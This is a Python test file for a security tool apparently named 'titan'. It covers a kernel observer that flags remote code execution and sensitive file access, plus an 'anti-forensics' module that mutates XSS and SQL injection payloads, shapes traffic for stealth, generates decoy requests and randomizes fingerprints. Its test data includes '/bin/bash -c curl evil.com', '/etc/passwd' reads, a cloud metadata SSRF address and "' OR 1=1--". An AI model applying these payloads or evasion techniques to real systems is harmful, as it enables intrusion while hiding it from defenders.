"""Tests for Phase 3 (Kernel Observation) and Phase 8 (Anti-Forensics).

Phase 3:
  - KernelObserver: mode selection, session management, observation analysis
  - FallbackKernelObserver: process/network monitoring
  - Evidence tier system

Phase 8:
  - TrafficShaper: timing profiles, timeline generation
  - PolymorphicEngine: encoding, variant detection, uniqueness
  - DecoyGenerator: decoy request generation
  - FingerprintRandomizer: header randomization
  - AntiForensics: full attack preparation
"""

from __future__ import annotations

import asyncio
import time

import pytest

from titan.verify.kernel import (
    EBPFKernelObserver,
    EvidenceTier,
    FallbackKernelObserver,
    KernelObserver,
    KernelObservation,
    KernelSession,
    ObservationType,
)
from titan.stealth.advanced import (
    AGGRESSIVE_PROFILE,
    BROWSER_PROFILE,
    STEALTH_PROFILE,
    AntiForensics,
    DecoyGenerator,
    FingerprintRandomizer,
    PolymorphicEngine,
    TrafficShaper,
    TimingProfile,
)


# ---------------------------------------------------------------------------
# Phase 3: Kernel Observation tests
# ---------------------------------------------------------------------------

class TestKernelObservation:
    def test_rce_confirmed(self):
        obs = KernelObservation(
            type=ObservationType.PROCESS_EXEC,
            evidence_tier=EvidenceTier.KERNEL,
            data={"filename": "/bin/bash -c curl evil.com", "proof": True},
        )
        assert obs.is_rce_confirmed is True

    def test_not_rce(self):
        obs = KernelObservation(
            type=ObservationType.FILE_OPEN,
            evidence_tier=EvidenceTier.KERNEL,
            data={"filename": "/etc/passwd"},
        )
        assert obs.is_rce_confirmed is False

    def test_file_access(self):
        obs = KernelObservation(
            type=ObservationType.FILE_OPEN,
            evidence_tier=EvidenceTier.SYSCALL,
            data={"filename": "/etc/passwd"},
        )
        assert obs.is_file_access is True

    def test_network_obs(self):
        obs = KernelObservation(
            type=ObservationType.OUTBOUND_CONNECTION,
            evidence_tier=EvidenceTier.SYSCALL,
            data={"remote": "169.254.169.254:80"},
        )
        assert obs.is_network is True


class TestKernelSession:
    def test_add_observation(self):
        session = KernelSession(pid=1234, mode="ebpf")
        obs = KernelObservation(
            type=ObservationType.PROCESS_EXEC,
            evidence_tier=EvidenceTier.KERNEL,
            data={"filename": "/bin/id"},
        )
        session.add(obs)
        assert len(session.observations) == 1

    def test_rce_count(self):
        session = KernelSession(pid=1234, mode="ebpf")
        session.add(KernelObservation(type=ObservationType.PROCESS_EXEC, evidence_tier=EvidenceTier.KERNEL, data={"proof": True}))
        session.add(KernelObservation(type=ObservationType.PROCESS_EXEC, evidence_tier=EvidenceTier.KERNEL, data={"proof": True}))
        session.add(KernelObservation(type=ObservationType.FILE_OPEN, evidence_tier=EvidenceTier.SYSCALL))
        assert session.rce_count == 2

    def test_file_access_count(self):
        session = KernelSession(pid=1234, mode="ebpf")
        session.add(KernelObservation(type=ObservationType.FILE_OPEN, evidence_tier=EvidenceTier.SYSCALL))
        session.add(KernelObservation(type=ObservationType.FILE_READ, evidence_tier=EvidenceTier.SYSCALL))
        session.add(KernelObservation(type=ObservationType.PROCESS_EXEC, evidence_tier=EvidenceTier.KERNEL))
        assert session.file_access_count == 2

    def test_duration(self):
        session = KernelSession(pid=1234, mode="ebpf")
        assert session.duration >= 0


class TestEvidenceTier:
    def test_all_tiers_exist(self):
        assert EvidenceTier.SUSPICION.value == "suspicion"
        assert EvidenceTier.KERNEL.value == "kernel"
        assert EvidenceTier.EXPLOIT.value == "exploit"

    def test_tier_ordering(self):
        """Tiers should be ordered by evidence quality."""
        tiers = [
            EvidenceTier.SUSPICION,
            EvidenceTier.REFLECTION,
            EvidenceTier.BEHAVIORAL,
            EvidenceTier.DIFFERENTIAL,
            EvidenceTier.FLOW_TYPED,
            EvidenceTier.KERNEL,
            EvidenceTier.EXPLOIT,
        ]
        # All should be distinct
        assert len(set(tiers)) == len(tiers)


class TestKernelObserver:
    def test_best_available(self):
        observer = KernelObserver()
        mode = observer.best_available()
        assert mode in ("ebpf", "process", "none")

    @pytest.mark.asyncio
    async def test_attach_returns_session(self):
        observer = KernelObserver()
        session = await observer.attach(pid=0, duration=0.1, mode="process")
        assert isinstance(session, KernelSession)
        assert session.mode in ("process", "none")

    @pytest.mark.asyncio
    async def test_attach_no_process(self):
        observer = KernelObserver()
        session = await observer.attach(pid=99999, duration=0.1, mode="process")
        assert isinstance(session, KernelSession)

    def test_analyze_observations_empty(self):
        observer = KernelObserver()
        session = KernelSession(pid=0, mode="none")
        findings = observer.analyze_observations(session)
        assert findings == []

    def test_analyze_rce_observation(self):
        observer = KernelObserver()
        session = KernelSession(pid=1234, mode="process")
        session.add(KernelObservation(
            type=ObservationType.PROCESS_EXEC,
            evidence_tier=EvidenceTier.SYSCALL,
            data={"pid": 1234, "filename": "/bin/bash"},
            metadata={"source": "psutil"},
        ))
        findings = observer.analyze_observations(session)
        assert len(findings) == 1
        assert findings[0]["type"] == "kernel_process_execution"
        assert findings[0]["tier"] == "confirmed"

    def test_analyze_file_access(self):
        observer = KernelObserver()
        session = KernelSession(pid=1234, mode="process")
        session.add(KernelObservation(
            type=ObservationType.FILE_OPEN,
            evidence_tier=EvidenceTier.SYSCALL,
            data={"filename": "/etc/passwd"},
            metadata={"source": "/proc"},
        ))
        findings = observer.analyze_observations(session)
        assert len(findings) == 1
        assert findings[0]["type"] == "kernel_sensitive_file_access"
        assert findings[0]["severity"] == "critical"


class TestEBPFKernelObserver:
    def test_availability(self):
        # On Windows, eBPF should not be available
        available = EBPFKernelObserver.is_available()
        assert isinstance(available, bool)


class TestFallbackKernelObserver:
    def test_always_available(self):
        assert FallbackKernelObserver.is_available() is True

    @pytest.mark.asyncio
    async def test_attach_returns_session(self):
        observer = FallbackKernelObserver()
        session = await observer.attach(pid=0, duration=0.1)
        assert isinstance(session, KernelSession)


# ---------------------------------------------------------------------------
# Phase 8: Anti-Forensics tests
# ---------------------------------------------------------------------------

class TestTrafficShaper:
    def test_default_profile(self):
        shaper = TrafficShaper()
        assert shaper.profile.name == "browser"

    def test_custom_profile(self):
        shaper = TrafficShaper("stealth")
        assert shaper.profile.name == "stealth"

    def test_shape_timeline_count(self):
        shaper = TrafficShaper()
        timeline = shaper.shape_timeline(10)
        assert len(timeline) == 10

    def test_timeline_sorted(self):
        shaper = TrafficShaper()
        timeline = shaper.shape_timeline(20)
        assert timeline == sorted(timeline)

    def test_timeline_positive(self):
        shaper = TrafficShaper()
        timeline = shaper.shape_timeline(10)
        assert all(t >= 0 for t in timeline)

    def test_calculate_delays(self):
        shaper = TrafficShaper()
        delays = shaper.calculate_delays(10, budget=30.0)
        assert len(delays) == 10
        assert all(d >= 0 for d in delays)
        assert sum(delays) <= 30.0

    def test_stealth_slower_than_aggressive(self):
        stealth = TrafficShaper("stealth")
        aggressive = TrafficShaper("aggressive")
        s_timeline = stealth.shape_timeline(5)
        a_timeline = aggressive.shape_timeline(5)
        assert s_timeline[-1] > a_timeline[-1]


class TestTimingProfiles:
    def test_browser_profile(self):
        assert BROWSER_PROFILE.base_delay > 0
        assert BROWSER_PROFILE.jitter > 0

    def test_stealth_profile(self):
        assert STEALTH_PROFILE.base_delay > BROWSER_PROFILE.base_delay

    def test_aggressive_profile(self):
        assert AGGRESSIVE_PROFILE.base_delay < BROWSER_PROFILE.base_delay


class TestPolymorphicEngine:
    def test_auto_detect_xss(self):
        engine = PolymorphicEngine()
        assert engine._detect_variant("alert(1)") == "xss"
        assert engine._detect_variant("<script>") == "xss"

    def test_auto_detect_sqli(self):
        engine = PolymorphicEngine()
        assert engine._detect_variant("' OR 1=1--") == "sqli"
        assert engine._detect_variant("SELECT * FROM users") == "sqli"

    def test_auto_detect_ssrf(self):
        engine = PolymorphicEngine()
        assert engine._detect_variant("http://169.254.169.254/") == "ssrf"

    def test_generate_unique_variants(self):
        engine = PolymorphicEngine()
        variants = engine.generate("alert(1)", count=5)
        assert len(variants) == 5
        assert len(set(variants)) == 5  # All unique

    def test_url_encoding(self):
        engine = PolymorphicEngine()
        result = engine._encode("A", "url_encode", "generic")
        assert result == "%41"

    def test_html_entity_encoding(self):
        engine = PolymorphicEngine()
        result = engine._encode("<", "html_entity", "xss")
        assert result == "&#60;"

    def test_base64_encoding(self):
        engine = PolymorphicEngine()
        result = engine._encode("test", "base64", "generic")
        assert result == "dGVzdA=="

    def test_xss_transform(self):
        engine = PolymorphicEngine()
        result = engine._xss_transform("alert(1)")
        assert result != "alert(1)" or result == "alert(1)"  # May or may not change

    def test_sqli_transform(self):
        engine = PolymorphicEngine()
        # Run multiple times — transforms are random, at least one should differ
        results = {engine._sqli_transform("SELECT * FROM users") for _ in range(20)}
        assert len(results) > 1 or list(results)[0] != "SELECT * FROM users"


class TestDecoyGenerator:
    def test_generate_count(self):
        gen = DecoyGenerator()
        decoys = gen.generate("https://example.com", count=5)
        assert len(decoys) == 5

    def test_decoy_has_required_fields(self):
        gen = DecoyGenerator()
        decoys = gen.generate("https://example.com", count=1)
        assert "url" in decoys[0]
        assert "method" in decoys[0]
        assert "headers" in decoys[0]

    def test_decoy_urls_are_valid(self):
        gen = DecoyGenerator()
        decoys = gen.generate("https://example.com", count=3)
        for d in decoys:
            assert d["url"].startswith("https://example.com")

    def test_decoy_has_user_agent(self):
        gen = DecoyGenerator()
        decoys = gen.generate("https://example.com", count=1)
        assert "User-Agent" in decoys[0]["headers"]


class TestFingerprintRandomizer:
    def test_randomize_headers(self):
        rand = FingerprintRandomizer()
        headers = rand.randomize_headers()
        assert "User-Agent" in headers
        assert "Accept" in headers
        assert "Accept-Language" in headers

    def test_different_each_time(self):
        rand = FingerprintRandomizer()
        h1 = rand.randomize_headers()
        h2 = rand.randomize_headers()
        # Headers should differ (at least in optional headers)
        assert h1 != h2

    def test_base_headers_preserved(self):
        rand = FingerprintRandomizer()
        headers = rand.randomize_headers({"X-Custom": "value"})
        assert headers["X-Custom"] == "value"


class TestAntiForensics:
    def test_prepare_attack(self):
        af = AntiForensics()
        result = af.prepare_attack("alert(1)", "https://example.com")
        assert "polymorphic_payloads" in result
        assert "decoy_requests" in result
        assert "timing" in result
        assert "headers" in result
        assert "stats" in result

    def test_attack_stats(self):
        af = AntiForensics()
        result = af.prepare_attack("alert(1)", "https://example.com")
        stats = result["stats"]
        assert stats["payload_variants"] == 3  # default
        assert stats["decoy_count"] == 3  # default
        assert stats["total_requests"] == 6

    def test_attack_with_custom_counts(self):
        af = AntiForensics(decoy_count=5, polymorphic_count=10)
        result = af.prepare_attack("' OR 1=1--", "https://example.com")
        stats = result["stats"]
        assert stats["payload_variants"] == 10
        assert stats["decoy_count"] == 5
